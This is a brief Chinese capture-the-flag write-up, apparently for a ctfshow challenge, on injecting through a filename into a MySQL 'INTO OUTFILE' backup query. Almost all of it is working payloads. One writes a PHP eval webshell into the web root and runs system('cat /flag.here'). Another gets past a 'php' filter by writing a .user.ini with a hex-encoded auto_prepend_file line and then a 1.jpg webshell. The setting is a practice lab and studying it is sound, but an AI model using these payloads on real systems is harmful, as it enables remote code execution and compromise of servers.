场景
```
  //备份表
  $sql = "select * from ctfshow_user into outfile '/var/www/html/dump/{$filename}';";   
```
```
在api/dump.php传POST
filename=ma.php' LINES STARTING BY '<?php eval($_GET[1]);?>'#

然后访问url/dump/ma.php

url/dump/ma.php?1=system('cat /flag.here');
```

过滤了php
```
filename=.user.ini' lines starting by ';' terminated by 0x0a6175746f5f70726570656e645f66696c653d312e6a70670a;#
为保证auto_prepend_file=1.jpg在单独一行，所以在开头结尾都加上了0x0a来换行

filename=1.jpg' LINES STARTING BY '<?=eval($_GET[1]);?>'#

```
